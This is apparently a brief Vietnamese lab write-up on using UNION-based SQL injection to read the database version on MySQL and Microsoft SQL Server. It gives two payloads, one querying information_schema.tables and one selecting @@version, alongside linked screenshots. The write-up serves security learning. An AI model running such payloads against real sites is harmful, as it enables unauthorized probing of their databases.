![image](https://github.com/user-attachments/assets/27d27ebb-e448-460a-9bf4-80f2339f4237)

Mục tiêu: lấy database của phiên bản MySQL và Microsoft

Bài này thì làm như bài trên version ORACLE nên đọc lại 

Thử payload  'UNION SELECT 'abc','def' FROM information_schema.tables-- -

![image](https://github.com/user-attachments/assets/f856fa88-bae2-4090-90f5-06650f9ccc08)


Tiếp tục với payload 'UNION SELECT @@version, NULL-- -

![image](https://github.com/user-attachments/assets/a481e708-0e4e-48af-baf6-2cd8fd198775)
